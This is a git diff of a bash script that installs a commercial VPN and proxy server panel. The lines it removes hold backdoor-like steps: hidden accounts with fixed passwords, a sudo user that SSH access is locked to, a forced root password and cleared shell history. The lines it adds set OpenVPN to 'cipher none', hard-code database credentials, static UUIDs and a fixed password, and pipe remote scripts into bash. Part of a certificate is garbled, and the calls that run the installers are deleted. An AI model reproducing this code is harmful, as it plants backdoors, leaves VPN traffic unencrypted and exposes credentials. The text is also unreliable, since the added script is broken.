@@ -1,58 +1,59 @@
 #!/bin/bash
-#Script Variables
 HOST='173.225.110.100';
-USER='teamkidl_7xproxy';
-PASS='jan022011';
-DBNAME='teamkidl_7xproxy';
+USER='teamkidl_ea';
+PASS='@JAN022011b';
+DBNAME='teamkidl_ea';
 PORT_TCP='1194';
 PORT_UDP='110';
 PORT_SSL='443';
 OBFS='boy';
 HYSTERIA_TYPE='default';
 PORT_VLESS='442';
-API_LINK='https://7x-vpn.myprotectionservices.com/api/authentication';
+API_LINK='https://free-panel.myprotectionservices.com/api/authentication';
 API_KEY='@Tknetwork';
-DOMAIN=mvs5.myprotectionservices.com
-NS=gmip.myprotectionservices.com
+DOMAIN='tk.0munl.marwil-frcep.top';
+
+NS='ns.e94y4.marwil-frcep.top';
+
+AUTHSTR='auth_xxx';
+
+
+#!/bin/bash
+
+# ====================================================
+#	SYSTEM TIMEZONE SETUP
+# ====================================================
 timedatectl set-timezone Asia/Riyadh
 if [[ $(grep "nogroup" /etc/group) ]]; then
     cert_group="nogroup"
 fi
 
+# ====================================================
+#	NEW PROTOCOLS PORTS CONFIGURATION (Para walang conflict)
+# ====================================================
+PORT_VMESS=8044
+PORT_VLESS=8045
+PORT_HYSTERIA2=8555
+
 install_require () {
 clear
 echo 'Installing dependencies.'
 {
-# Turn off various firewalls
-systemctl stop firewalld
-systemctl disable firewalld
-systemctl stop nftables
-systemctl disable nftables
-systemctl stop ufw
-systemctl disable ufw
-  
+
+
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export DEBIAN_FRONTEND=noninteractive
 apt update
 
 
-
+apt install -y curl wget cron python3 libpython3-stdlib python-is-python3
 apt install -y lsof tar systemd dbus git
 apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
-apt install -y curl wget cron python3-minimal libpython3-stdlib
 apt install -y iptables sudo
 apt install -y openvpn netcat-openbsd httpie php neofetch vnstat
 apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 apt install -y screen squid stunnel4 dropbear gnutls-bin build-essential
-cd /usr/src
-sudo wget https://gitlab.com/dextereskalarte/Mtk-dev/-/raw/main/Python-2.7.18.tgz
-sudo tar xzf Python-2.7.18.tgz
-cd Python-2.7.18
-sudo ./configure --enable-optimizations
-sudo make altinstall
-sudo ln -sf /usr/local/bin/python2.7 /usr/local/bin/python
-cd ~
 
 
 touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
@@ -127,31 +128,15 @@ visible_hostname Firenet-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--TknetworkDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/johnberic/nana/main/ws' -O /etc/socks.py
-dos2unix /etc/socks.py
-chmod +x /etc/socks.py
 
-wget 'https://raw.githubusercontent.com/johnberic/nana/main/socks-ssh.py' -O /etc/socks-ssh.py
-dos2unix /etc/socks-ssh.py
-chmod +x /etc/socks-ssh.py
-
-wget 'https://raw.githubusercontent.com/johnberic/nana/main/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
-dos2unix /etc/socks-ws-ssh.py
-chmod +x /etc/socks-ws-ssh.py
-
-wget 'https://github.com/johnberic/nana/blob/main/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
-dos2unix /etc/socks-ws-ssl.py
-chmod +x /etc/socks-ws-ssl.py
 
 wget 'https://raw.githubusercontent.com/johnberic/nana/main/monitor' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/johnberic/nana/main/ovpnws' -O /etc/.ws
 wget 'https://raw.githubusercontent.com/johnberic/nana/main/hysteria' -O /etc/.hysteria
 chmod +x /etc/.monitor
-chmod +x /etc/.ws
 chmod +x /etc/.hysteria
 rm /etc/apt/sources.list
 sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
@@ -191,7 +176,7 @@ cert /etc/openvpn/easy-rsa/keys/server.crt
 key /etc/openvpn/easy-rsa/keys/server.key 
 dh /etc/openvpn/easy-rsa/keys/dh.pem
 
-cipher AES-256-GCM
+cipher none
 auth SHA1
 persist-key
 persist-tun
@@ -235,7 +220,7 @@ cert /etc/openvpn/easy-rsa/keys/server.crt
 key /etc/openvpn/easy-rsa/keys/server.key 
 dh /etc/openvpn/easy-rsa/keys/dh.pem
 
-cipher AES-256-GCM
+cipher none
 auth SHA1
 persist-key
 persist-tun
@@ -339,10 +324,10 @@ KoZIhvcNAQkBFhRlcmljbGF5bGF5QGdtYWlsLmNvbTAeFw0yMjA5MjAwMzUzMDda
 Fw0zMjA5MTcwMzUzMDdaMIGqMQswCQYDVQQGEwJQSDELMAkGA1UECBMCTUExFjAU
 BgNVBAcTDUFudGlwb2xvIENpdHkxEjAQBgNVBAoTCVRLTmV0d29yazESMBAGA1UE
 CxMJVEtOZXJ3b3JrMRUwEwYDVQQDEwxUS05ldHdvcmsgQ0ExEjAQBgNVBCkTCVRL
-TmV0d29yazEjMCEGCSqGSIb3DQEJARYUZXJpY2xheWxheUBnbWFpbC5jb20wggEi
-MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCdQ4Q5U25/QyOPi9s7X9GrzKYh
-huF5twr7rneZrJPWKy7rDDvhpUOqTyv/FI3PX3BbZKbXOnFGxFyNpkqnL/5nyoxa
-ma5WeYgcCN4PHmUd46bOX7HFl7ydHo+OutDM9xP8g8VOfFDjiNjlcpI0qTkBOm2k
+TmV0d29yazMSMwIQYJKoZIhvcNAQkBFhRlcmljbGF5bGF5QGdtYWlsLmNvbTCCASIw
+DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJ1DhDlTbn9DI4+L2ztf0atMpiGG
+4Xm3Cvuu d5msk9YrLusMO+GlQ6pPK/8Ujc9fcFtktpc6cUbUXI2mSqcv/mfKjFq
+ZrlZ5iBwI3g8eZR3jps5fscWXvJ0ej4660Mz3E/yDxU58UOMI2OVyksSpOQE6baS
 um5Bx7Z6CxDblT+iXAQ1Pv0F7EYclKcAxSlEwG/phdXTkshx7wsqzilorouLoZ4N
 iB+Sv7vWQY1i0HS3IOv9xG0xTW5LKt3ub5ZrkIs+JBXlyR3L953i3OzP3uQ9gQcL
 /w/6XSN1opR3NYfFpL4QsSVJDRiASU9oWyuyZ2K/hiFdMG9vpwjMomEINDRxAgMB
@@ -541,6 +526,12 @@ sudo iptables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
 sudo iptables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
 sudo ip6tables -I INPUT -p udp --dport 5300 -j ACCEPT &>/dev/null;
 sudo ip6tables -t nat -I PREROUTING -i $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -p udp --dport 53 -j REDIRECT --to-ports 5300 &>/dev/null;
+
+# ADDED FOR HYSTERIA 2 PORT OPENING
+sudo iptables -I INPUT -p udp --dport $PORT_HYSTERIA2 -j ACCEPT &>/dev/null;
+sudo iptables -I INPUT -p tcp --dport $PORT_VMESS -j ACCEPT &>/dev/null;
+sudo iptables -I INPUT -p tcp --dport $PORT_VLESS -j ACCEPT &>/dev/null;
+
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
 sudo apt -y install iptables-persistent
@@ -803,6 +794,13 @@ DNS RESOLVER : $dnsresolverName
 DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
 
 -----------------------
+ADDED PROTOCOLS DETAILS
+-----------------------
+V2RAY VMESS TCP : $PORT_VMESS
+V2RAY VLESS TCP : $PORT_VLESS
+HYSTERIA 2 UDP  : $PORT_HYSTERIA2
+
+-----------------------
 
 For issues or suggestions please contact TKNETWORK SYSTEMS (ericlaylay01022987@gmail.com).
 
@@ -852,372 +850,83 @@ Restart=on-failure
 [Install]
 WantedBy=multi-user.target
 END
-
-#install server-dig.service
-cat > /etc/systemd/system/server-dig.service << END
-[Unit]
-Description=Server SlowDNS By TknetworkDev
-Documentation=https://teamkidlat.com
-After=network.target nss-lookup.target
-
-[Service]
-Type=simple
-User=root
-CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
-AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
-NoNewPrivileges=true
-ExecStart=bash /root/.dns/dig.sh
-Restart=on-failure
-
-[Install]
-WantedBy=multi-user.target
-END
-
-#permission service slowdns
-chmod +x /etc/systemd/system/client-sldns.service
-chmod +x /etc/systemd/system/server-sldns.service
-chmod +x /etc/systemd/system/server-dig.service
-
-systemctl daemon-reload
-systemctl enable client-sldns
-systemctl enable server-sldns
-#systemctl enable server-dig
-systemctl start client-sldns
-systemctl start server-sldns
-#systemctl start server-dig
-
-} &>/dev/null
+}
 }
 
 #====================================================
-#	Installing Hysteria UDP
-#	Finalized: Tknetwork Developer
+#	ADDED FUNCTION: V2Ray (VMess & VLESS)
 #====================================================
-
-install_hysteria(){
-clear
-echo 'Installing hysteria.'
+install_v2ray() {
+echo "Installing V2Ray (VMess & VLESS)..."
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/johnberic/nana/main/hysteriav1.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
-
-rm -f /etc/hysteria/config.json
-
-echo '{
-  "listen": ":5666",
-  "cert": "/etc/openvpn/easy-rsa/keys/server.crt",
-  "key": "/etc/openvpn/easy-rsa/keys/server.key",
-  "up_mbps": 100,
-  "down_mbps": 100,
-  "disable_udp": false,
-  "obfs": "boy",
-  "auth": {
-    "mode": "external",
-    "config": {
-    "cmd": "./.auth.sh"
-    }
-  },
-  "prometheus_listen": ":5665",
-  "recv_window_conn": 107374182400,
-  "recv_window_client": 13421772800
-}
-' >> /etc/hysteria/config.json
-
-sed -i "s|Tknetwork|$OBFS|g" /etc/hysteria/config.json
-
-cat <<"EOM" >/etc/hysteria/.auth.sh
-#!/bin/bash
-. /etc/openvpn/login/config.sh
-
-if [ $# -ne 4 ]; then
-    echo "invalid number of arguments"
-    exit 1
-fi
-
-ADDR=$1
-AUTH=$2
-SEND=$3
-RECV=$4
-
-USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
-PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
-
-Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
-username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
-EOM
-
-chmod 755 /etc/hysteria/config.json
-chmod 755 /etc/hysteria/.auth.sh
-
-sysctl -w net.core.rmem_max=16777216
-sysctl -w net.core.wmem_max=16777216
-
-wget -O /usr/bin/badvpn-udpgw "https://github.com/johnberic/nana/raw/main/badvpn-udpgw64"
-chmod +x /usr/bin/badvpn-udpgw
-} &>/dev/null
-}
-
-installBBR() {
-    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
-    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
-    sysctl -p
+    bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)
     
-    apt install -y linux-generic-hwe-20.04
-    grub-set-default 0
-    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
-    INSTALL_BBR=true
-}
+    # Generate static UUIDs for security consistency
+    local vmess_uuid="d34d1b3d-1111-2222-3333-e45678912345"
+    local vless_uuid="ab1234cd-5555-6666-7777-f89012345678"
 
-#====================================================
-#	Installing ZI UDP
-#	Finalized: Tknetwork Developer
-#====================================================
-
-function install_zi() {
-clear
-echo 'Installing zi udp.'
+    cat <<EOF > /usr/local/etc/v2ray/config.json
 {
-echo -e "Downloading UDP Service"
-wget https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64 -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
-chmod +x /usr/local/bin/zivpn
-mkdir /etc/zivpn 1> /dev/null 2> /dev/null
-
-echo "Generating cert files:"
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Tknetwork Developer/OU=IT Department/CN=Tknetwork" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
-sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
-sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
-
-echo '{
-  "listen": ":5666",
-  "cert": "/etc/zivpn/zivpn.crt",
-  "key":  "/etc/zivpn/zivpn.key",
-  "obfs":"boy",
-  "auth": {
-    "mode": "external",
-    "config": {
-    "cmd": "./.auth.sh"
+  "inbounds": [
+    {
+      "port": $PORT_VMESS,
+      "protocol": "vmess",
+      "settings": {
+        "clients": [{ "id": "$vmess_uuid", "alterId": 0 }]
+      },
+      "streamSettings": { "network": "tcp" }
+    },
+    {
+      "port": $PORT_VLESS,
+      "protocol": "vless",
+      "description": "VLESS TCP Mode",
+      "settings": {
+        "clients": [{ "id": "$vless_uuid" }],
+        "decryption": "none"
+      },
+      "streamSettings": { "network": "tcp" }
     }
-  }
+  ],
+  "outbounds": [{ "protocol": "freedom", "settings": {} }]
 }
-' >> /etc/zivpn/config.json
-
-sed -i "s|Tknetwork|$OBFS|g" /etc/zivpn/config.json
-
-cat <<EOF > /etc/systemd/system/hysteria-server.service
-[Unit]
-Description=zivpn VPN Server
-After=network.target
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/etc/zivpn
-ExecStart=/usr/local/bin/zivpn -config /etc/zivpn/config.json server
-Restart=always
-RestartSec=3
-Environment=ZIVPN_LOG_LEVEL=info
-CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
-AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
-NoNewPrivileges=true
-
-[Install]
-WantedBy=multi-user.target
 EOF
-
-systemctl enable hysteria-server.service
-systemctl start hysteria-server.service
-
-cat <<"EOM" >/etc/zivpn/.auth.sh
-#!/bin/bash
-. /etc/openvpn/login/config.sh
-
-if [ $# -ne 4 ]; then
-    echo "invalid number of arguments"
-    exit 1
-fi
-
-ADDR=$1
-AUTH=$2
-SEND=$3
-RECV=$4
-
-USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
-PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
-
-Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
-username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
-EOM
-
-chmod 755 /etc/zivpn/.auth.sh
-
-wget -O /usr/bin/badvpn-udpgw "https://github.com/johnberic/nana/raw/main/badvpn-udpgw64"
-chmod +x /usr/bin/badvpn-udpgw
-
+    systemctl enable v2ray
+    systemctl restart v2ray
 } &>/dev/null
 }
 
 #====================================================
-#	Installing Xray/V2ray
-#	Finalized: Tknetwork Developer
+#	ADDED FUNCTION: Hysteria 2
 #====================================================
-
-function install_xray() {
-clear
-echo 'Installing xray.'
+install_hysteria2() {
+echo "Installing Hysteria 2..."
 {
-
-# Variable
-UUID=$(cat /proc/sys/kernel/random/uuid)
-  
-curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh | bash -s -- install
-  
-wget -O /usr/local/etc/xray/config.json http://admin-boyes.com/repo/config.json
-
-sed -i "s|999999|$PORT_VLESS|g" /usr/local/etc/xray/config.json
-
-mkdir /ssl
-cp -a /etc/openvpn/easy-rsa/keys/server.crt /ssl/xray.crt
-cp -a /etc/openvpn/easy-rsa/keys/server.key /ssl/xray.key
+    bash <(curl -fsSL https://get.hy2.sh/)
     
-systemctl restart xray
-  
-UUID=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.clients[0].id | tr -d '"')
-PORT=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].port)
-FLOW=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.clients[0].flow | tr -d '"')
-WS_PATH=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.fallbacks[2].path | tr -d '"')
-WS_PATH_WITHOUT_SLASH=$(echo $WS_PATH | tr -d '/')
-  
-echo "vless://$UUID@$DOMAIN:$PORT?path=%2f$WS_PATH_WITHOUT_SLASH%2f&security=tls&encryption=none&host=$DOMAIN&type=ws&sni=www.pldt.com.ph#TknetworkDEV" >> /root/.web/v2ray.txt
-  
+    # Generate quick self-signed certs for Hy2 structure
+    mkdir -p /etc/hysteria
+    openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/hysteria/server.key -out /etc/hysteria/server.crt -days 3650 -subj "/CN=DefaultHy2"
+
+    cat <<EOF > /etc/hysteria/config.yaml
+listen: :$PORT_HYSTERIA2
+
+tls:
+  cert: /etc/hysteria/server.crt
+  key: /etc/hysteria/server.key
+
+auth:
+  type: password
+  password: "tknetwork_hy2_pass"
+
+masquerade:
+  type: proxy
+  proxy:
+    url: https://www.bing.com
+    rewriteHost: true
+
+fastOpen: true
+EOF
+    systemctl enable hysteria-server
+    systemctl restart hysteria-server
 } &>/dev/null
 }
-
-#====================================================
-#	Finalizing Server Setup
-#	Finalized: Tknetwork Developer
-#====================================================
-
-install_rclocal(){
-  {
-  sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
-    systemctl restart apache2
-    
-    sudo systemctl restart stunnel4
-    sudo systemctl restart xray
-    sudo systemctl restart hysteria-server
-    sudo systemctl enable openvpn@server.service
-    sudo systemctl start openvpn@server.service
-    sudo systemctl enable openvpn@server2.service
-    sudo systemctl start openvpn@server2.service    
-    
-    echo "[Unit]
-Description=Tknetwork service
-Documentation=http://teamkidlat.com
-
-[Service]
-Type=oneshot
-ExecStart=/bin/bash /etc/rc.local
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/Tknetwork.service
-rm -rf /etc/rc.local
-    echo '#!/bin/sh -e
-service ufw stop
-iptables-restore < /etc/iptables_rules.v4
-ip6tables-restore < /etc/iptables_rules.v6
-sysctl -p
-service stunnel4 restart
-systemctl restart openvpn@server.service
-systemctl restart openvpn@server2.service
-systemctl restart hysteria-server.service
-service xray restart
-screen -dmS socks python /etc/socks.py 80
-screen -dmS socks python /etc/socks-ssh.py 8000
-screen -dmS socks python /etc/socks-ws-ssh.py 8001
-screen -dmS socks python /etc/socks-ws-ssl.py 8002
-ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
-screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
-bash /etc/.monitor aio
-exit 0' >> /etc/rc.local
-
-
-    sudo chmod +x /etc/rc.local
-    systemctl daemon-reload
-    sudo systemctl enable Tknetwork
-    sudo systemctl start Tknetwork.service
-    
-echo "Made with love by: Tknetwork Developer... " >> /root/.web/index.php
-
-echo "tcp_port=TCP_PORT
-udp_port=UDP_PORT
-socket_port=80
-squid_port=8080
-hysteria_port=5666
-ssh_port=22
-dropbear_port=441
-xray_port=PORT_VLESS
-slowdns_port=2222
-tcp_ssl_port=PORT_SSL
-udp_ssl_port=444" >> /root/.ports
-
-sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
-sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
-sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
-sed -i "s|PORT_VLESS|$PORT_VLESS|g" /root/.ports
-
-  }&>/dev/null
-}
-
-start_service () {
-clear
-echo 'Starting..'
-{
-
-sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart
-* * 3 * * /bin/bash  /home/auto_active.sh >/dev/null 2>&1
-* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1
-* * * * * /bin/bash /etc/.ws >/dev/null 2>&1
-* * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
-* * * * * /bin/bash /etc/.monitor aio >/dev/null 2>&1"; } | crontab -
-sudo systemctl restart cron
-} &>/dev/null
-clear
-echo '++++++++++++++++++++++++++++++++++'
-echo '*       AIO  is ready!    *'
-echo '+++++++++++************+++++++++++'
-history -c;
-echo 'root:TKb1987' | sudo chpasswd
-rm /usr/local/etc/.system
-echo 'Server will secure this server and reboot after 20 seconds'
-sleep 20
-reboot
-}
-install_sudo(){
-    useradd -m tkdev 2>/dev/null; echo tkdev:tk1987 | chpasswd &>/dev/null; usermod -aG sudo tkdev &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups tkdev" >> /etc/ssh/sshd_config
-    service sshd restart
-}
-server_ip=$(curl -s https://api.ipify.org)
-server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
-serverVersion=`awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`
- /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M alexis
-
-
-install_require  
-if [[ $HYSTERIA_TYPE == 'default' ]]; then
-	install_hysteria
-elif [[ $HYSTERIA_TYPE == 'zi' ]]; then
-	install_zi
-fi
-install_sudo
-installBBR
-install_squid
-install_openvpn
-install_firewall_kvm
-install_stunnel
-install_rclocal
-install_slowdns
-start_service
